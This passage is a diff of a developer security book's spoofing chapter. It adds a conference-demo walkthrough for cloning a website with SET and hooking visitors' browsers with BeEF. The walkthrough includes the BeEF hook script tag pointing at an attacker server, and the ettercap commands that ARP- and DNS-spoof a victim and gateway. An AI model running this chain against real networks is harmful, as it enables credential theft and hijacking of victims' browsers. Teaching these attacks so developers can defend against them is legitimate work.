@@ -41,7 +41,7 @@ Taking the IP spoofing attack further. The MitM sends out ARP replies across the
 This attack only works on a LAN.  
 The attack is often used as a component of larger attacks, harvesting credentials, cookies, CSRF tokens, hijacking. Even using TLS (in many cases TLS can be [downgraded](#network-identify-risks-tls-downgrade)). 
 
-![](images/HandsOnHack.png)
+There is a complete cloning example of a website, ARP spoof, DNS spoof, hands on hack, in the [website section below](#network-identify-risks-spoofing-website).
 
 * [MitM with ARP spoofing](http://blog.binarymist.net/2015/04/25/web-server-log-management/#mitm)
 * [With TLS](http://frishit.com/tag/ettercap/)
@@ -62,7 +62,9 @@ DNS spoofing refers to an end goal rather than a specific type of attack. There 
   * offering a free wifi hot-spot attached to your gateway with DNS server provided.
  Your DNS server provides your cloned website IP address. You may still have to deal with X.509 certificates though, unless the website enforces TLS across the entire site, which is definitely my recommendation. If not, and the potential victim already has the websites certificate they are wanting to visit in their browser, then you'll have to hope your victim will click through the warning or work out a TLS downgrade which is going to be harder.
 
-[dnschef](http://www.question-defense.com/2012/12/14/dnschef-backtrack-privilege-escalation-spoofing-attacks-network-spoofing-dnschef) is a flexible spoofing tool. Would be interesting to test on the likes of Arpon and Unbound.
+There is a complete cloning example of a website, ARP spoof, DNS spoof, hands on hack, in the [website section below](#network-identify-risks-spoofing-website)
+
+[dnschef](http://www.question-defense.com/2012/12/14/dnschef-backtrack-privilege-escalation-spoofing-attacks-network-spoofing-dnschef) is a flexible spoofing tool, also available in Kali Linux. Would be interesting to test on the likes of Arpon and Unbound.
 
 {#network-identify-risks-spoofing-referrer}
 #### Referrer
@@ -97,9 +99,77 @@ Often the sender of a spoofed email will use a from address that you recognise i
 
 <!---Todo: Check out Subterfuge, mentioned in "Basic Security Testing With Kali Linux"-->
 <!---Todo: pg 160 of "The Hacker Playbook" could be worth demoing here-->
-An attacker can clone a legitimate website (with the likes of the Social Engineering Kit (SET)) and through [social engineering](#people), phishing, email spoofing or any other number of tricks coerce a victim to browse the spoofed website. Once on the spoofed website, the attacker can harvest credentials or carry out many other types of attacks against the non-suspecting user.
+An attacker can clone a legitimate website (with the likes of the Social Engineering Kit (SET)) or the Browser Exploitation Framework (BeEF) and through [social engineering](#people), phishing, email spoofing or any other number of tricks, coerce a victim to browse the spoofed website. In fact, if you clone a website that you know your victim visits regularly, then you can just do that and sit and wait for them to take the bait. Better still automote your attack so that when they do take the bait exploits are fired at them automatically. Once the victim is on the spoofed website, the attacker can harvest credentials or carry out many other types of attacks against the non-suspecting user.
 
-Often a website is cloned that the victim visits regularly, which can even remove the need for social engineering, phishing, email spoofing. The victim visits the attackers cloned website due to ARP or DNS spoofing. The attacker can do any number of things at this point. Simply harvest credentials or launch many different types of attacks. For example Subterfuge to run a plethora of attacks against the victims browser through the likes of the Metasploit Browser AutoPwn module. If >0 attacks are successful, the attacker will usually get a remote command shell to the victims system. Then simply forward them onto the legitimate website without them even being aware of the attack.
+The victim may visit the attackers cloned website due to ARP and/or DNS spoofing. Subterfuge is handy to run a plethora of attacks against the victims browser through the likes of the Metasploit Browser AutoPwn module. If >0 attacks are successful (we've managed to install a rootkit), the attacker will usually get a remote command shell to the victims system by way of reverse or bind shell. Then simply forward them onto the legitimate website without them even being aware of the attack.
+
+![](images/HandsOnHack.png)
+
+The following attack was one of five that I demonstrated at WDCNZ in 2015. The two leading up to this one provide some context and it's probably best to look at them first if you haven't already.
+
+You can find the video of how it is played out [here](https://www.youtube.com/watch?v=ymnqTrnF85M).
+
+##### Synopsis
+
+The average victim will see a valid URL and the spoof will be undetectable. Use website that you know victim is likely to spend some time at. This can make it easier if you're running exploits manually in BeEF.
+
+Can be used to obtain credentials or simply hook with BeEF and run any number of exploits.
+
+SET would be run on the website you want to clone. As SET only gets the index file, you'll have to use the likes of wget to get any other missing resources you need to complete the website. Static sites are obviously the easiest. We don't really want to have to create a back-end for the cloned website. You may have to update some of the link's to external resources as well in the index.html file that SET creates.
+
+Ideally you'll have cleaned out the public web directory that apache hosts from `/var/www/`. If you don't, I think SET archives everything in there.
+
+##### The Play
+
+Run:
+`setoolkit`
+Choose:
+`2) Website Attack Vectors`
+`3) Credential Harvester Attack Method`
+`2) Site Cloner`
+Enter the IP address you want to host from. This will probably be the machine you're running these commands from. Although you could host anywhere.  
+Enter the URL to clone.
+`y` to start apache.  
+Here you'll need to either wget any files your missing if you are missing some, or if there are only a small number, just grab them out of your browser developer tools.  
+Add the BeEF hook (`<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>`)into the index.html in `/var/www/` usually at the end of the body, just before the `</body>` tag.  
+
+From the directory that you have BeEF installed, run the BeEF ruby script: `./beef`  
+
+Add an 'A' record of the website you've just cloned and want to spoof into ettercap's dns file: `echo "<domainname-you-want-to-clone.com> A <IP address that's hosting the clone>" >> /etc/ettercap/etter.dns`  
+
+Now run ettercap which is going to both ARP and DNS spoof your victim and the victim's gateway with the MITM option, using dns_spoof plugin:  
+`ettercap -M arp:remote -P dns_spoof -q -T /<gateway IP address>/ /<victim IP address>/`.  
+
+You can now log into the BeEF web UI.
+
+Now when the victim visits your cloned web site, the URL will look legitimate and they'll have no idea that their browser is a BeEF zombie continually asking it's master (the BeEF comms server) what to execute next.  
+
+
+BeEF can also be used to clone web sites using it's REST API, but it takes more work. The below on using BeEF to do this is only if you really have to.  
+In order to clone, once you have BeEF running:  
+`curl -H "Content-Type: application/json: charset=UTF-8" -d '{"url":"http://<domainname-you-want-to-clone.com>", "mount":"/"}' -X POST http://127.0.0.1/api/seng/clone_page?token=<token that BeEF provides when you start it up each time>;`
+The loop-back IP address is just the address that the BeEF REST API is listening on.  
+When you run this command, you should get back: `{"success":true,"mount":"/"}`,
+BeEF should also say that it's cloning page at URL `http://<domainname-you-want-to-clone.com>` with other information.  
+As with SET, if any resources other than a single index.html are required,
+then they also have to be acquired separately. With BeEF, they need to be copied into `/usr/share/beef-xss/extensions/social_engineering/web_cloner/cloned_pages/`. Routes have to be created in `/usr/share/beef-xss/extensions/social_engineering/web_cloner/interceptor.rb` and also modified to add new [config "hook"](http://sourceforge.net/p/piwat/WAT-Pentoo/ci/6402fce4c6966639927acb72c516edd203c41b77/tree/bin/beef/extensions/social_engineering/web_cloner/web_cloner.rb#l17), also added to `/usr/share/beef-xss/config.yaml`. Within the same config.yaml file `host` seems to serve two purposes. The address to access beef and where to fetch hook.js from. If I use an external address, beef only listens on the external interface (can't reach via loopback). So I added a `hook` config which is the address that the beef communications server is listening on that gets inserted into the cloned web page.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 {#network-identify-risks-doppelganger-domains}
 ### Doppelganger Domains
